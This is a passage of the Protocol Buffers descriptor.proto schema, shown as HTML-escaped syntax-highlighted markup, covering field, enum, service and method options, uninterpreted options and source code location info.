  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}

message FieldOptions {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The ctype option instructs the C++ code generator to use a different
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; representation of the field than it normally would.  See the specific
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; options below.  This option is not yet implemented in the open source
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; release -- sorry, we'll try to include it in a future version!&lt;/span&gt;
  optional CType ctype = &lt;span&gt;1&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt; =&lt;span&gt; STRING];
  &lt;/span&gt;&lt;span&gt;enum&lt;/span&gt;&lt;span&gt; CType {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Default mode.&lt;/span&gt;
    STRING = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    CORD &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    STRING_PIECE &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
  }
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The packed option can be enabled for repeated primitive fields to enable
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; a more efficient representation on the wire. Rather than repeatedly
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; writing the tag and type for each element, the entire array is encoded as
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; a single length-delimited blob. In proto3, only explicit setting it to
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; false will avoid using packed encoding.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; packed = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The jstype option determines the JavaScript type used for values of the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; field.  The option is permitted only for 64 bit integral and fixed types
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; (int64, uint64, sint64, fixed64, sfixed64).  A field with jstype JS_STRING
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is represented as JavaScript string, which avoids loss of precision that
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; can happen when a large value is converted to a floating point JavaScript.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Specifying JS_NUMBER for the jstype causes the generated JavaScript code to
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; use the JavaScript &quot;number&quot; type.  The behavior of the default option
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; JS_NORMAL is implementation dependent.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; This option is an enum to permit additional types to be added, e.g.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; goog.math.Integer.&lt;/span&gt;
  optional JSType jstype = &lt;span&gt;6&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt; =&lt;span&gt; JS_NORMAL];
  &lt;/span&gt;&lt;span&gt;enum&lt;/span&gt;&lt;span&gt; JSType {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use the default type.&lt;/span&gt;
    JS_NORMAL = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use JavaScript strings.&lt;/span&gt;
    JS_STRING = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Use JavaScript numbers.&lt;/span&gt;
    JS_NUMBER = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
  }

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Should this field be parsed lazily?  Lazy applies only to message-type
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; fields.  It means that when the outer message is initially parsed, the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; inner message's contents will not be parsed but instead stored in encoded
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; form.  The inner message will actually be parsed when it is first accessed.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; This is only a hint.  Implementations are free to choose whether to use
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; eager or lazy parsing regardless of the value of this option.  However,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; setting this option true suggests that the protocol author believes that
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; using lazy parsing on this field is worth the additional bookkeeping
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; overhead typically needed to implement it.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; This option does not affect the public interface of any generated code;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; all method signatures remain the same.  Furthermore, thread-safety of the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; interface is not affected by this option; const methods remain safe to
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; call from multiple threads concurrently, while non-const methods continue
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to require exclusive access.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Note that implementations may choose not to check required fields within
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; a lazy sub-message.  That is, calling IsInitialized() on the outer message
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; may return true even if the inner message has missing required fields.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This is necessary because otherwise the inner message would have to be
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; parsed in order to perform the check, defeating the purpose of lazy
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; parsing.  An implementation which chooses not to check required fields
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; must be consistent about it.  That is, for any particular sub-message, the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; implementation must either *always* check its required fields, or *never*
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; check its required fields, regardless of whether or not the message has
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; been parsed.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; lazy = &lt;span&gt;5&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this field deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for accessors, or it will be completely ignored; in the very least, this
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is a formalization for deprecating fields.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;3&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; For Google-internal migration only. Do not use.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; weak = &lt;span&gt;10&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];


  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;

  reserved &lt;/span&gt;&lt;span&gt;4&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; removed jtype&lt;/span&gt;
&lt;span&gt;}

message OneofOptions {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}

message EnumOptions {

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Set this option to true to allow mapping different tag names to the same
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; value.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; allow_alias = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this enum deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for the enum, or it will be completely ignored; in the very least, this
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is a formalization for deprecating enums.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;3&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  reserved &lt;/span&gt;&lt;span&gt;5&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; javanano_as_lite

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}

message EnumValueOptions {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this enum value deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for the enum value, or it will be completely ignored; in the very least,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this is a formalization for deprecating enum values.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;1&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}

message ServiceOptions {

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Note:  Field numbers 1 through 32 are reserved for Google's internal RPC
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   framework.  We apologize for hoarding these numbers to ourselves, but
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   we were already using them long before we decided to release Protocol
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   Buffers.

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this service deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for the service, or it will be completely ignored; in the very least,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this is a formalization for deprecating services.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;33&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}

message MethodOptions {

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Note:  Field numbers 1 through 32 are reserved for Google's internal RPC
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   framework.  We apologize for hoarding these numbers to ourselves, but
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   we were already using them long before we decided to release Protocol
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   Buffers.

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this method deprecated?
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Depending on the target platform, this can emit Deprecated annotations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for the method, or it will be completely ignored; in the very least,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this is a formalization for deprecating methods.&lt;/span&gt;
  optional &lt;span&gt;bool&lt;/span&gt; deprecated = &lt;span&gt;33&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;false&lt;/span&gt;&lt;span&gt;];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Is this method side-effect-free (or safe in HTTP parlance), or idempotent,
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; or neither? HTTP based RPC implementation may choose GET verb for safe
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; methods, and PUT verb for idempotent methods instead of the default POST.&lt;/span&gt;
  &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; IdempotencyLevel {
    IDEMPOTENCY_UNKNOWN &lt;/span&gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    NO_SIDE_EFFECTS     &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; implies idempotent&lt;/span&gt;
    IDEMPOTENT          = &lt;span&gt;2&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; idempotent, but may have side effects&lt;/span&gt;
&lt;span&gt;  }
  optional IdempotencyLevel idempotency_level &lt;/span&gt;=
      &lt;span&gt;34&lt;/span&gt; [&lt;span&gt;default&lt;/span&gt;=&lt;span&gt;IDEMPOTENCY_UNKNOWN];

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The parser stores options it doesn't recognize here. See above.&lt;/span&gt;
  repeated UninterpretedOption uninterpreted_option = &lt;span&gt;999&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Clients can define custom options in extensions of this message. See above.&lt;/span&gt;
  extensions &lt;span&gt;1000&lt;/span&gt;&lt;span&gt; to max;
}


&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; A message representing a option the parser does not recognize. This only
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; appears in options protos created by the compiler::Parser class.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; DescriptorPool resolves these when building Descriptor objects. Therefore,
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; options protos in descriptor objects (e.g. returned by Descriptor::options(),
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; or produced by Descriptor::CopyTo()) will never have UninterpretedOptions
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; in them.&lt;/span&gt;
&lt;span&gt;message UninterpretedOption {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The name of the uninterpreted option.  Each string represents a segment in
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; a dot-separated name.  is_extension is true iff a segment represents an
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; extension (denoted with parentheses in options specs in .proto files).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; E.g.,{ [&quot;foo&quot;, false], [&quot;bar.baz&quot;, true], [&quot;qux&quot;, false] } represents
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; &quot;foo.(bar.baz).qux&quot;.&lt;/span&gt;
&lt;span&gt;  message NamePart {
    required &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; name_part = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    required &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; is_extension = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
  }
  repeated NamePart name &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;

  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The value of the uninterpreted option, in whatever type the tokenizer
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; identified it as during parsing. Exactly one of these should be set.&lt;/span&gt;
  optional &lt;span&gt;string&lt;/span&gt; identifier_value = &lt;span&gt;3&lt;/span&gt;&lt;span&gt;;
  optional uint64 positive_int_value &lt;/span&gt;= &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;
  optional int64 negative_int_value &lt;/span&gt;= &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;
  optional &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; double_value = &lt;span&gt;6&lt;/span&gt;&lt;span&gt;;
  optional bytes string_value &lt;/span&gt;= &lt;span&gt;7&lt;/span&gt;&lt;span&gt;;
  optional &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; aggregate_value = &lt;span&gt;8&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ===================================================================
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Optional source code info

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Encapsulates information about the original source file from which a
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; FileDescriptorProto was generated.&lt;/span&gt;
&lt;span&gt;message SourceCodeInfo {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; A Location identifies a piece of source code in a .proto file which
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; corresponds to a particular definition.  This information is intended
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to be useful to IDEs, code indexers, documentation generators, and similar
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; tools.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; For example, say we have a file like:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   message Foo {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     optional string foo = 1;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   }
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Let's look at just the field definition:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional string foo = 1;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   ^       ^^     ^^  ^  ^^^
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   a       bc     de  f  ghi
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We have the following locations:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   span   path               represents
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [a,i)  [ 4, 0, 2, 0 ]     The whole field definition.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [a,b)  [ 4, 0, 2, 0, 4 ]  The label (optional).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [c,d)  [ 4, 0, 2, 0, 5 ]  The type (string).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [e,f)  [ 4, 0, 2, 0, 1 ]  The name (foo).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [g,h)  [ 4, 0, 2, 0, 3 ]  The number (1).
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Notes:
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - A location may refer to a repeated field itself (i.e. not to any
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   particular index within it).  This is used whenever a set of elements are
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   logically enclosed in a single code segment.  For example, an entire
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   extend block (possibly containing multiple extension definitions) will
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   have an outer location whose path refers to the &quot;extensions&quot; repeated
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   field without an index.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - Multiple locations may have the same path.  This happens when a single
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   logical declaration is spread out across multiple places.  The most
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   obvious example is the &quot;extend&quot; block again -- there may be multiple
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   extend blocks in the same scope, each of which will have the same path.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - A location's span is not always a subset of its parent's span.  For
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   example, the &quot;extendee&quot; of an extension declaration appears at the
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   beginning of the &quot;extend&quot; block and is shared by all extensions within
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   the block.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - Just because a location's span is a subset of some other location's span
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   does not mean that it is a descendent.  For example, a &quot;group&quot; defines
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   both a type and a field in a single declaration.  Thus, the locations
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   corresponding to the type and field and their components will overlap.
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - Code which tries to interpret locations should probably be designed to
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   ignore those that it doesn't understand, as more types of locations could
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   be recorded in the future.&lt;/span&gt;
  repeated Location location = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
  message Location {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Identifies which part of the FileDescriptorProto was defined at this
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; location.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Each element is a field number or an index.  They form a path from
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the root FileDescriptorProto to the place where the definition.  For
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; example, this path:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [ 4, 3, 2, 7, 1 ]
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; refers to:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   file.message_type(3)  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 4, 3
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;       .field(7)         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2, 7
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;       .name()           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This is because FileDescriptorProto.message_type has field number 4:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   repeated DescriptorProto message_type = 4;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and DescriptorProto.field has field number 2:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   repeated FieldDescriptorProto field = 2;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and FieldDescriptorProto.name has field number 1:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   optional string name = 1;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Thus, the above path gives the location of a field name.  If we removed
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the last element:
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;   [ 4, 3, 2, 7 ]
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; this path refers to the whole field declaration (from the beginning
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; of the label to the terminating semicolon).&lt;/span&gt;
    repeated int32 path = &lt;span&gt;1&lt;/span&gt; [packed=&lt;span&gt;true&lt;/span&gt;&lt;span&gt;];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Always has exactly three or four elements: start line, start column,
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; end line (optional, otherwise assumed same as start line), end column.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; These are packed into a single field for efficiency.  Note that line
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and column numbers are zero-based -- typically you will want to add
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1 to each before displaying to a user.&lt;/span&gt;
    repeated int32 span = &lt;span&gt;2&lt;/span&gt; [packed=&lt;span&gt;true&lt;/span&gt;&lt;span&gt;];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If this SourceCodeInfo represents a complete declaration, these are any
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; comments appearing before and after the declaration which appear to be
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; attached to the declaration.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; A series of line comments appearing on consecutive lines, with no other
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; tokens appearing on those lines, will be treated as a single comment.
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; leading_detached_comments will keep paragraphs of comments that appear
